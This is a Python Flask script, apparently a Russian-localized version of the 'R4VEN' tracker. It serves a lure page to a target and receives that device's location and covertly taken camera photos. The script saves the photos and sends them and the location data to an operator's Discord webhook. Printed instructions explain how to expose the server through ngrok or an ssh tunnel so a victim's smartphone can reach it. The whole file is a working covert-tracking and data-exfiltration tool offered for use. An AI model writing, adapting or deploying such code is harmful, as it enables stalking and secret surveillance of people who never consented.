#!/usr/bin/env python3
import os
from flask import Flask, request, jsonify, Response
from utils import get_file_data, update_webhook
import time
from colorama import Fore, Back, Style
import requests

if os.path.exists('image'):
    print("present")
else:
    os.mkdir('image')
PATH_TO_IMAGES_DIR = 'image'

DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
HTML_FILE_NAME = "index.html"
app = Flask(__name__)

twitter_url = 'https://#'
discord = 'https://#'
website = 'https://#'
blog = 'https://#'
github = 'https://#'

VERSION = '1.1.3'

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'
Y = '\033[33m'

banner = r'''                                                    
__________    _________   _______________ _______   
\______   \  /  |  \   \ /   /\_   _____/ \      \  
 |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
 |    |   \/    ^   /\     /   |        \/    |    \
 |____|_  /\____   |  \___/   /_______  /\____|__  /
        \/      |__|                  \/         \/ 

'''

des = r'''
Отслеживайте местоположение устройства и IP-адрес, а также делайте фотографии с подробностями об устройстве.
'''


@app.route("/", methods=["GET"])
def get_website():
    html_data = ""
    try:
        html_data = get_file_data(HTML_FILE_NAME)
    except FileNotFoundError:
        pass
    return Response(html_data, content_type="text/html")


@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    discord_webhook = ""
    try:
        discord_webhook = get_file_data(DISCORD_WEBHOOK_FILE_NAME)
    except FileNotFoundError:
        pass
    update_webhook(discord_webhook, data)
    return "OK"


@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']  # get the image
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
    print(Fore.YELLOW + "Целевые изображения сняты и сохранены")

    # Прочтите URL-адрес веб-перехватчика Discord с dwebhook.js
    with open('dwebhook.js', 'r') as webhook_file:
        webhook_url = webhook_file.read().strip()

    # Send the image to the Discord webhook
    files = {'image': open(f'{PATH_TO_IMAGES_DIR}/{f}', 'rb')}
    response = requests.post(webhook_url, files=files)

    return Response("%s сохранено и отправлено в вебхук Discord" % f)


def main():
    """
    Точка входа в программу
    """
    print_banners()
    remove_old_discord_webhook()
    get_new_discord_webhook()
    print_port_forwarding_instructions()
    # start_http_server()


def print_banners():
    """
    prints the program banners
    """
    print(f'{R}{banner}{W}')
    print(f'{Y}{des}{W}\n')
    print(f'{G}[+] {C}Version      : {W}{VERSION}')
    print(f'{G}[+] {C}Created By   : {W}Pasha2302')
    print(f'{G} ╰➤ {C}Twitter      : {W}{twitter_url}')
    print(f'{G} ╰➤ {C}Discord      : {W}{discord}')
    print(f'{G} ╰➤ {C}Website      : {W}{website}')
    print(f'{G} ╰➤ {C}Blog         : {W}{blog}')
    print(f'{G} ╰➤ {C}Github       : {W}{github}\n')


def print_port_forwarding_instructions():
    """
    Печатает инструкцию по переадресации портов
    """
    print(f'\n{R}ПРИМЕЧАНИЕ: {Y}Убедитесь, что вы перенаправили порт, иначе он не будет работать в браузере смартфона. \n')
    print(f'{G}Для переадресации портов установите ngrok или используйте ssh')
    print(f'{C}Для типа переадресации портов ngrok  : {Y}ngrok http 8000')
    print(f'{C}Для типа переадресации портов SSH : {Y}ssh -R 80:localhost:8000 ssh.localhost.run')
    print(f'{W}ИЛИ вы можете использовать любой инструмент, с помощью которого хотите выполнить портирование.\n')
    print(f'{G}Информация о треке будет отправлена на ваш вебхук Discord.\n{W}')


def get_new_discord_webhook():
    """
    Получает новый вебхук Discord от пользователя
    """
    print(f'{R}Введите URL-адрес веб-хука Discord:{W}')
    dwebhook_input = input()
    file1 = open('dwebhook.js', 'w')
    file1.write(dwebhook_input)
    file1.close()


def remove_old_discord_webhook():
    """
    removes the old discord webhook
    """
    try:
        os.system("rm dwebhook.js")
    except:
        pass


if __name__ == "__main__":
    main()
    # app.run(debug=False, host="0.0.0.0", port=8000)
    app.run(debug=False, host="0.0.0.0", port=8000)
